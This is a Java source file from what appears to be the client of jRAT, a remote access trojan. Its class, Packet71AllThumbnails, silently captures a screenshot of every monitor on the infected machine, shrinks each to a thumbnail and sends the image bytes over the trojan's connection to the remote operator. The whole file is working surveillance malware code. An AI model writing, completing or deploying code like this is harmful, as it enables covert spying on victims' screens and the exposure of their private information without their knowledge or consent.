package jrat.client.packets.outgoing;

import jrat.client.Connection;
import jrat.common.utils.ImageUtils;

import java.awt.*;
import java.awt.image.BufferedImage;

public class Packet71AllThumbnails implements OutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {
		try {
			GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();

            con.writeInt(devices.length);
			
			for (int i = 0; i < devices.length; i++) {
				GraphicsDevice screen = devices[i];
				Robot robot = new Robot(screen);
				Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();
				
				BufferedImage image = robot.createScreenCapture(screenBounds);
				image = ImageUtils.resize(image, 150, 100);
				
				byte[] buffer = ImageUtils.encode(image);

                con.writeInt(buffer.length);
                con.write(buffer);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public short getPacketId() {
		return 71;
	}

}
